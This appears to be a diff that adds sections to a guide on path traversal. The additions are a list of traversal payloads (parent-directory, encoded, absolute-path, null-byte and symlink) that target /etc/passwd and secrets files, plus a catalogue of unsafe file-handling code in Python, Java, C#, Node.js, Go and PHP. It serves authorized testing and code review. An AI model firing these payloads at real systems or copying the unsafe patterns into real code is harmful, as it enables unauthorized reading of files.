@@ -30,6 +30,107 @@ The unsafe assumption is that users will only request legitimate filenames. URL 
 | **Write paths** | Upload save, log rotation, export directories with crafted names |
 | **Symlink risk** | Resolved paths escape via symlinks under the base directory |
 
+## Attack Payloads
+
+Use these in authorized tests against download, avatar, and attachment parameters named `file`, `path`, or `filename`.
+
+### Pattern 1: Classic parent-directory traversal
+
+```text
+../../../etc/passwd
+..\..\..\windows\win.ini
+```
+
+### Pattern 2: URL-encoded and double-encoded sequences
+
+```text
+..%2f..%2fetc%2fpasswd
+%2e%2e%2fetc%2fpasswd
+..%252f..%252fetc%252fpasswd
+```
+
+### Pattern 3: Absolute path injection
+
+```text
+/etc/passwd
+C:\boot.ini
+file:///etc/passwd
+```
+
+### Pattern 4: Null-byte truncation (legacy stacks)
+
+```text
+../../../etc/passwd%00.png
+```
+
+### Pattern 5: Symlink under allowed base (abuse scenario)
+
+```bash
+# Attacker creates symlink in writable area
+ln -s /etc/passwd /var/app/uploads/avatar.png
+# Server serves "avatar.png" → reads /etc/passwd
+```
+
+### Pattern 6: Identifier resolved to path without confinement
+
+```text
+GET /files?id=../../../../secrets/db.yml
+```
+
+## Language-Specific Sinks and Dangerous APIs
+
+Search for path joins and file APIs that use user input before canonicalization against a base directory.
+
+### Python
+
+```python
+open(os.path.join(UPLOAD_DIR, filename))
+Path(base) / user_path
+send_file(request.args["path"])
+```
+
+`flask.send_from_directory` without `safe_join`; `shutil.copy` with user filenames.
+
+### Java
+
+```java
+new FileInputStream(baseDir + "/" + filename);
+Paths.get(uploadRoot, userSuppliedName);
+Files.readAllBytes(Paths.get(userPath));
+```
+
+`ResourceUtils.getFile`, Spring `Resource` handlers, `ServletContext.getResourceAsStream`.
+
+### C#
+
+```csharp
+var path = Path.Combine(_base, fileName);
+return PhysicalFile(path, "application/octet-stream");
+File.ReadAllBytes(userPath);
+```
+
+### JavaScript (Node.js)
+
+```javascript
+const p = path.join(__dirname, "uploads", req.query.file);
+fs.readFileSync(p);
+res.sendFile(req.params.name, { root: uploads });
+```
+
+### Go
+
+```go
+http.ServeFile(w, r, filepath.Join(base, r.URL.Query().Get("f")))
+ioutil.ReadFile(path.Join(dir, name))
+```
+
+### PHP and legacy
+
+```php
+include($_GET['page'] . '.php');
+readfile('/var/docs/' . $_GET['doc']);
+```
+
 ## Sample Vulnerable Code in Python
 
 ```python
